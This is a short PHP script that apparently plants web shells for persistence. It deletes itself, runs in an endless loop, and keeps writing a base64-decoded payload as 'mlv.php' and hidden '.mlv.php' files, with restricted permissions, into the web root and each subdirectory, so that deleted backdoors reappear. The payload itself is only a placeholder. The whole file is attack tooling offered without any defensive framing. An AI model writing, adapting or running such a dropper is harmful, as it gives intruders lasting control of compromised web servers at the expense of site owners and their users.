<?php
    set_time_limit(0);
    ignore_user_abort(1);

    $shell = <<<EOT
SHELLSHELLSHELL
EOT;

    function writeShell($path)
    {
        global $shell;
        foreach (['mlv','.mlv'] as $t) {
            $tmp = $path . DIRECTORY_SEPARATOR . $t . ".php";
            file_put_contents($tmp, base64_decode($shell));
            @chmod($tmp, 0550);
        }
    }
    function walkDir($path, $cb=null)
    {
        $list = glob($path . DIRECTORY_SEPARATOR . '*');
        foreach ($list as $f) {
            print_r($f . "\n");
            if (is_dir($f)) {
                writeShell($f);
            }
        }
    }

    unlink(__FILE__);
    $path = (file_exists($path.DIRECTORY_SEPARATOR."index.php") && $_SERVER['DOCUMENT_ROOT'] != "") ? $_SERVER['DOCUMENT_ROOT'] : "./";
    while (1) {
        writeShell($path);
        walkDir($path);
        usleep(50);
    }
